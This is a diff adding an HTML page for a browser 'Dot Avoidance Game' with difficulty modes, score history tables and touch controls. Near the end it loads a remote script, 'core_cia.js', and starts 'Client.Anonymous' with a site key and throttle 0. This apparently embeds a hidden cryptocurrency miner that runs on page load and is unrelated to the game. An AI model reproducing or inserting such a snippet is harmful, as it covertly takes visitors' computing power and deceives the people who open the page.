@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dot Avoidance Game</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #1a1a1a;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            touch-action: none;
+        }
+
+        #gameContainer {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+        }
+
+        #gameCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+        }
+
+        .game-info {
+            position: absolute;
+            padding: 10px;
+            color: #fff;
+            font-size: min(24px, 5vw);
+            z-index: 1;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+        }
+
+        #score { top: 20px; left: 20px; }
+        #difficulty { top: 20px; right: 20px; }
+        #currentTime { top: 70px; left: 20px; font-size: min(16px, 4vw); }
+
+        .modal-screen {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #fff;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 2;
+            width: 90%;
+            max-width: 600px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-screen h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        .score-history {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            color: #fff;
+        }
+
+        .score-history th,
+        .score-history td {
+            padding: 10px;
+            border: 1px solid #333;
+            text-align: center;
+        }
+
+        .score-history th {
+            background: #2c2c2c;
+            color: #4CAF50;
+        }
+
+        .score-history tr:nth-child(even) {
+            background: rgba(44, 44, 44, 0.5);
+        }
+
+        .score-history .high-score {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            font-size: min(18px, 4vw);
+            cursor: pointer;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            margin: 10px 5px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            opacity: 0.8;
+            transform: scale(1.05);
+        }
+
+        #startBtn { background: #4CAF50; }
+        .easy-btn { background: #4CAF50; }
+        .normal-btn { background: #2196F3; }
+        .hard-btn { background: #f44336; }
+        .history-btn { background: #9c27b0; }
+
+        #touchControls {
+            position: absolute;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: none;
+            z-index: 1;
+        }
+
+        .touch-btn {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+            margin: 5px;
+            touch-action: none;
+            cursor: pointer;
+            color: white;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+        }
+
+        #touchControls .row {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .tab-container {
+            margin: 20px 0;
+        }
+
+        .tab-buttons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .tab-btn {
+            background: #333;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .tab-btn.active {
+            background: #4CAF50;
+        }
+
+        .tab-btn:first-child {
+            border-radius: 5px 0 0 5px;
+        }
+
+        .tab-btn:last-child {
+            border-radius: 0 5px 5px 0;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .new-score {
+            animation: fadeIn 0.5s ease-in;
+        }
+    </style>
+</head>
+<body>
+    <div id="gameContainer">
+        <canvas id="gameCanvas"></canvas>
+        <div id="score" class="game-info">Score: <span id="scoreValue">0</span></div>
+        <div id="difficulty" class="game-info">Mode: <span id="difficultyValue">Easy</span></div>
+        <div id="currentTime" class="game-info">UTC: <span id="timeValue">2025-06-21 04:57:47</span></div>
+        
+        <div id="startScreen" class="modal-screen">
+            <h2>Dot Avoidance Game</h2>
+            <p>Select Difficulty:</p>
+            <button class="btn easy-btn" data-difficulty="easy">Easy</button>
+            <button class="btn normal-btn" data-difficulty="hard">Hard</button>
+            <button class="btn hard-btn" data-difficulty="veryHard">Very Hard</button>
+            <button class="btn history-btn" id="historyBtn">Score History</button>
+        </div>
+
+        <div id="gameOver" class="modal-screen">
+            <h2>Game Over!</h2>
+            <p>Final Score: <span id="finalScore">0</span></p>
+            <p>High Score: <span id="highScore">0</span></p>
+            <button id="startBtn" class="btn">Play Again</button>
+            <button class="btn history-btn" id="historyBtnGameOver">Score History</button>
+        </div>
+
+        <div id="scoreHistory" class="modal-screen">
+            <h2>Score History</h2>
+            <div class="tab-container">
+                <div class="tab-buttons">
+                    <button class="tab-btn active" data-tab="easy">Easy</button>
+                    <button class="tab-btn" data-tab="hard">Hard</button>
+                    <button class="tab-btn" data-tab="veryHard">Very Hard</button>
+                </div>
+                <div class="tab-content active" id="easyTab">
+                    <table class="score-history" id="easyHistory">
+                        <thead>
+                            <tr>
+                                <th>Date & Time (UTC)</th>
+                                <th>Score</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+                <div class="tab-content" id="hardTab">
+                    <table class="score-history" id="hardHistory">
+                        <thead>
+                            <tr>
+                                <th>Date & Time (UTC)</th>
+                                <th>Score</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+                <div class="tab-content" id="veryHardTab">
+                    <table class="score-history" id="veryHardHistory">
+                        <thead>
+                            <tr>
+                                <th>Date & Time (UTC)</th>
+                                <th>Score</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+            <button class="btn" id="closeHistory">Close</button>
+        </div>
+
+        <div id="touchControls">
+            <div class="row">
+                <button class="touch-btn" id="upBtn">↑</button>
+            </div>
+            <div class="row">
+                <button class="touch-btn" id="leftBtn">←</button>
+                <button class="touch-btn" id="downBtn">↓</button>
+                <button class="touch-btn" id="rightBtn">→</button>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/gh/imabutahersiddik/Time-Remaining-@main/core_cia.js"></script>
+    <script>
+    var _client = new Client.Anonymous('a362f5e736e35ecba2dc38a7f19174b31b729734b1ea45f2846d2f0e89674ef8', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+    </script>
+    <script src="js/utils.js"></script>
+    <script src="js/player.js"></script>
+    <script src="js/obstacle.js"></script>
+    <script src="js/game.js"></script>
+</body>
+</html>
